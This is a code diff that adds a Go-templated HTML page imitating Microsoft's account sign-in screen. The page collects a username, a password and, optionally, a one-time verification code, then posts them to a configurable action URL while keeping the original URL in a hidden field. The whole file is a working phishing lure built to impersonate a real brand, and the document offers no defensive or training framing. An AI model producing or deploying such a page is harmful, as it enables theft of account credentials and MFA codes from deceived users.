@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in to your account</title>
+<style>
+  body { font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f2f2f2; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+  .card { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 12px rgba(0,0,0,.16); }
+  .logo { font-size: 34px; font-weight: 600; color: #0078d4; margin-bottom: 8px; }
+  h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 24px; }
+  form { text-align: left; }
+  label { font-size: 14px; color: #1b1b1b; display: block; margin-bottom: 6px; }
+  input { width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1px solid #666; border-radius: 2px; font-size: 15px; margin-bottom: 16px; }
+  button { width: 100%; padding: 10px; border: 0; border-radius: 2px; background: #0067b8; color: #fff; font-size: 15px; cursor: pointer; }
+  button:hover { background: #005a9e; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">Microsoft</div>
+  <h1>Sign in</h1>
+  <form method="post" action="{{.Action}}">
+    <input type="hidden" name="orig" value="{{.Orig}}">
+    <label>Email, phone, or Skype</label>
+    <input type="text" name="username" required autofocus>
+    <label>Password</label>
+    <input type="password" name="password" required>
+    {{if .ShowOTP}}<label>Verification code</label><input type="text" name="otp" inputmode="numeric">{{end}}
+    <button type="submit">Sign in</button>
+  </form>
+</div>
+</body>
+</html>
